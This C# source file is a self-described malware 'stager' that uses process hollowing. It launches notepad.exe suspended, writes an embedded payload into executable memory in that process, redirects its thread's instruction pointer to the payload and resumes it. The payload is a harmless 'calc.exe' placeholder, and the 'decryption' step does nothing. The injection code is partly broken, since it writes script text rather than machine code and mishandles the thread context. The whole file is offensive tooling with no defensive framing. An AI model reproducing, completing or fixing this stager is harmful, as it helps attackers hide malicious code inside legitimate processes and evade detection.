// manual compile (DLL): mcs -target:library -out:Stager.dll decrypt.cs
// manual compile (EXE): mcs -out:Stager.exe decrypt.cs

// Author: AbdulRahman Ali 

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace CMDStager
{
    class Program
    {
        static void Main(string[] args)
        {
            // Embedded and encrypted payload
            byte[] encryptedPayload = {
                0x72, 0x65, 0x6D, 0x20, 0x22, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x22, 0x00
            };

            // Decrypt and execute the payload using process hollowing
            try
            {
                byte[] decryptedPayload = DecryptPayload(encryptedPayload);
                ExecutePayloadWithHollowing(decryptedPayload);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to decrypt and execute payload: {ex.Message}");
            }
        }

        static byte[] DecryptPayload(byte[] encryptedPayload)
        {
            // For demonstration, return the payload as-is (no decryption)
            return encryptedPayload;
        }

        static void ExecutePayloadWithHollowing(byte[] payload)
        {
            // Convert byte array to CMD script
            string command = Encoding.ASCII.GetString(payload);

            // Target process to hollow (notepad.exe for demonstration)
            string targetProcess = "notepad.exe";

            // Start the target process in a suspended state
            PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
            STARTUPINFO startupInfo = new STARTUPINFO();

            if (!CreateProcess(null, targetProcess, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref startupInfo, out processInfo))
            {
                throw new Exception("Failed to create suspended process.");
            }

            try
            {
                // Allocate memory in the target process for the payload
                IntPtr payloadAddress = VirtualAllocEx(processInfo.hProcess, IntPtr.Zero, (uint)payload.Length, AllocationType.MEM_COMMIT | AllocationType.MEM_RESERVE, MemoryProtection.PAGE_EXECUTE_READWRITE);

                if (payloadAddress == IntPtr.Zero)
                {
                    throw new Exception("Failed to allocate memory in target process.");
                }

                // Write the payload to the allocated memory
                if (!WriteProcessMemory(processInfo.hProcess, payloadAddress, payload, payload.Length, out _))
                {
                    throw new Exception("Failed to write payload to target process memory.");
                }

                // Replace the target process's entry point with the payload
                IntPtr threadContext = Marshal.AllocHGlobal(4096);
                try
                {
                    if (!GetThreadContext(processInfo.hThread, threadContext))
                    {
                        throw new Exception("Failed to get thread context.");
                    }

                    IntPtr entryPoint = (IntPtr)Marshal.ReadInt64(threadContext, 0x30); // RIP for x64
                    Marshal.WriteInt64(threadContext, 0x30, payloadAddress.ToInt64());

                    if (!SetThreadContext(processInfo.hThread, threadContext))
                    {
                        throw new Exception("Failed to set thread context.");
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(threadContext);
                }

                // Resume the target process
                if (ResumeThread(processInfo.hThread) == -1)
                {
                    throw new Exception("Failed to resume target process thread.");
                }

                Console.WriteLine("Payload executed successfully with process hollowing.");
            }
            finally
            {
                // Close handles
                CloseHandle(processInfo.hProcess);
                CloseHandle(processInfo.hThread);
            }
        }

        // Import required WinAPI functions and structures
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            ProcessCreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            AllocationType flAllocationType,
            MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetThreadContext(
            IntPtr hThread,
            IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetThreadContext(
            IntPtr hThread,
            IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        // Required structures and enums
        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [Flags]
        private enum ProcessCreationFlags : uint
        {
            CREATE_SUSPENDED = 0x00000004
        }

        [Flags]
        private enum AllocationType : uint
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000
        }

        [Flags]
        private enum MemoryProtection : uint
        {
            PAGE_EXECUTE_READWRITE = 0x40
        }
    }
}

